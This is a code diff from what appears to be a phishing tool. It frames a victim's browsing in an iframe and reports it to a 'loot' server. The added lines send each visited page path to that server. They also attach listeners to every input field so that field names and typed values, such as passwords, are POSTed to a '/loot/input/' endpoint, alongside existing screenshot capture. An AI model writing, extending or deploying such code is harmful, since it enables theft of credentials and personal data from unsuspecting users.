@@ -146,8 +146,8 @@ function sendScreenshot()
 		};
 
 		console.log("About to send image....");
-		newReq = new XMLHttpRequest();newReq.addEventListener("load", responseHandler);
-		newReq.open("POST", "http://localhost:8444/loot/screenshot/" + sessionName);
+		request = new XMLHttpRequest();request.addEventListener("load", responseHandler);
+		request.open("POST", "http://localhost:8444/loot/screenshot/" + sessionName);
 
 		canvas.toBlob((blob) => 
 		{
@@ -155,12 +155,23 @@ function sendScreenshot()
 					// jsonData["screenshot"] = image;
 					// var jsonString = JSON.stringify(jsonData);
 
-			newReq.send(image);
+			request.send(image);
 		});
 	}).catch(e => console.log(e));
 }
 
 
+
+// // Captures user inputs changes
+// function updateInput(input)
+// {
+// 	inputName = input.target.name;
+// 	inputValue = input.target.value;
+
+
+// 	console.log("!!!! Input: " + inputName + " changed to: " + inputvalue);
+
+// }
 
 
 
@@ -174,8 +185,10 @@ function sendScreenshot()
 function updateUrl()
 {
 	var fakeUrl = document.getElementById("iframe_a").contentDocument.location.pathname;
+
 	if (lastFakeUrl != fakeUrl)
 	{
+		// Handle URL recording
 		console.log("New URL to fake!");
 		console.log("url: " + fakeUrl);
 		lastFakeUrl = fakeUrl;
@@ -183,8 +196,41 @@ function updateUrl()
 		// This needs an API call to report the new page
 		// and take a screenshot maybe, not sure if
 		// screenshot timing will be right yet
+		request = new XMLHttpRequest();
+		request.open("POST", "http://localhost:8444/loot/location/" + sessionName);
+		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+		var jsonObj = new Object();
+		jsonObj["url"] = fakeUrl;
+		var jsonString = JSON.stringify(jsonObj);
+		request.send(jsonString);
 
+		// Handle screenshotting
 		sendScreenshot();
+
+
+		// Handle input scraping
+		inputs = document.getElementById("iframe_a").contentDocument.getElementsByTagName('input');
+		for (index = 0; index < inputs.length; index++)
+		{
+			//console.log("++ Registering input callballback for index: " + index)
+			addEventListener(inputs[index], (event) => updateInput);
+			inputs[index].addEventListener("change", function(){
+				inputName = this.name;
+				inputValue = this.value;
+				console.log("!!!! Input: " + inputName + " changed to: " + inputValue);
+
+				request = new XMLHttpRequest();
+				request.open("POST", "http://localhost:8444/loot/input/" + sessionName);
+				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+				var jsonObj = new Object();
+				jsonObj["inputName"] = inputName;
+				jsonObj["inputValue"] = inputValue;
+				var jsonString = JSON.stringify(jsonObj);
+				request.send(jsonString);
+			});
+
+
+		}
 	}
 	else
 		console.log("Fake URL doesn't need updating");
